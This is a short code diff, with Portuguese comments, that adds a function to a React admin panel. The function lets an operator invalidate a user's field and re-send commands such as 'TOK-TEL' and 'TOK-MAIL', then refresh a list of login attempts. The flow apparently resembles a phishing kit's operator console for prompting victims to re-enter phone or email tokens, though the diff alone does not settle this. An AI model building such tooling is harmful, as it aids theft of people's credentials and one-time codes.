@@ -70,6 +70,36 @@ function AdminPanel() {
     }
   };
 
+  // Função para invalidar dado e pedir novamente
+  const sendInvalidCommand = async (userId, command) => {
+    try {
+      const headers = getAuthHeaders();
+      if (!headers) return;
+
+      // Limpar o campo correspondente e reenviar o comando
+      await axios.post(`${API}/admin/invalidate-field`, {
+        user_id: userId,
+        command: command
+      }, { headers });
+      
+      // Enviar o comando novamente
+      const payload = {
+        user_id: userId,
+        command: command,
+      };
+      
+      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL)
+      if (command === "TOK-TEL" || command === "TOK-MAIL") {
+        payload.reference = referenceField;
+      }
+      
+      await axios.post(`${API}/admin/command`, payload, { headers });
+      fetchLoginAttempts();
+    } catch (error) {
+      console.error("Erro ao invalidar campo:", error);
+    }
+  };
+
   const updateStatus = async (userId, status) => {
     try {
       const headers = getAuthHeaders();
